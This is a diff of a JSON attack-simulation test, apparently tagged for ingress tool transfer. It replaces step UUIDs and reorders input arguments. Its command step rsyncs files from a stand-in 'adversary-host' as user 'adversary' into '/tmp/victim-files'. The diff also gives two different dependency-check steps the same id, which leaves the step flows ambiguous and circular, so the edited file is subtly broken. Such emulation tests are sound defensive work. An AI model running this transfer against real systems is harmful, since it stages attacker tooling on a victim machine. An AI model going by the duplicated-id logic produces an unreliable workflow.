@@ -8,7 +8,7 @@
   ],
   "steps": [
     {
-      "id": "31aecb2a-40f0-41d4-8ea7-e44eacbe6314",
+      "id": "97b3cdf6-c173-5371-a2b5-08c2b809089e",
       "type": "execute-command",
       "data": {
         "command": "rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}",
@@ -17,7 +17,7 @@
       "elevation_required": false
     },
     {
-      "id": "425ae06b-f2b7-4c44-9823-6c997a2e77d4",
+      "id": "103d5250-9ad5-51a3-8c7b-7e38c461a854",
       "name": "Check dependency 1/1",
       "description": "rsync must be installed on the machine \n",
       "type": "execute-command",
@@ -28,7 +28,7 @@
       "elevation_required": false
     },
     {
-      "id": "cb5cf174-8496-4743-8902-13f8322dfc0c",
+      "id": "0f320d86-e3bf-5b57-b306-e4091ac73599",
       "name": "Resolve dependency 1/1",
       "description": "rsync must be installed on the machine \n",
       "type": "execute-command",
@@ -39,7 +39,7 @@
       "elevation_required": false
     },
     {
-      "id": "c511c3fb-46d1-40b0-b743-b6be18dfc606",
+      "id": "103d5250-9ad5-51a3-8c7b-7e38c461a854",
       "name": "Re-check dependency 1/1",
       "description": "rsync must be installed on the machine \n",
       "type": "execute-command",
@@ -52,42 +52,30 @@
   ],
   "flows": [
     {
-      "s": "425ae06b-f2b7-4c44-9823-6c997a2e77d4",
+      "s": "103d5250-9ad5-51a3-8c7b-7e38c461a854",
       "p": "on-success",
-      "o": "31aecb2a-40f0-41d4-8ea7-e44eacbe6314"
+      "o": "97b3cdf6-c173-5371-a2b5-08c2b809089e"
     },
     {
-      "s": "425ae06b-f2b7-4c44-9823-6c997a2e77d4",
+      "s": "103d5250-9ad5-51a3-8c7b-7e38c461a854",
       "p": "on-failure",
-      "o": "cb5cf174-8496-4743-8902-13f8322dfc0c"
+      "o": "0f320d86-e3bf-5b57-b306-e4091ac73599"
     },
     {
-      "s": "cb5cf174-8496-4743-8902-13f8322dfc0c",
+      "s": "0f320d86-e3bf-5b57-b306-e4091ac73599",
       "p": "on-success",
-      "o": "c511c3fb-46d1-40b0-b743-b6be18dfc606"
+      "o": "103d5250-9ad5-51a3-8c7b-7e38c461a854"
     },
     {
-      "s": "c511c3fb-46d1-40b0-b743-b6be18dfc606",
+      "s": "103d5250-9ad5-51a3-8c7b-7e38c461a854",
       "p": "on-failure",
-      "o": "31aecb2a-40f0-41d4-8ea7-e44eacbe6314"
+      "o": "97b3cdf6-c173-5371-a2b5-08c2b809089e"
     }
   ],
   "tags": [
     "T1105"
   ],
   "input_arguments": [
-    {
-      "name": "local_path",
-      "type": "path",
-      "description": "Local path to receive rsync",
-      "value": "/tmp/victim-files"
-    },
-    {
-      "name": "username",
-      "type": "string",
-      "description": "User account to authenticate on remote host",
-      "value": "adversary"
-    },
     {
       "name": "remote_path",
       "type": "path",
@@ -99,6 +87,18 @@
       "type": "string",
       "description": "Remote host to copy from",
       "value": "adversary-host"
+    },
+    {
+      "name": "local_path",
+      "type": "path",
+      "description": "Local path to receive rsync",
+      "value": "/tmp/victim-files"
+    },
+    {
+      "name": "username",
+      "type": "string",
+      "description": "User account to authenticate on remote host",
+      "value": "adversary"
     }
   ]
 }
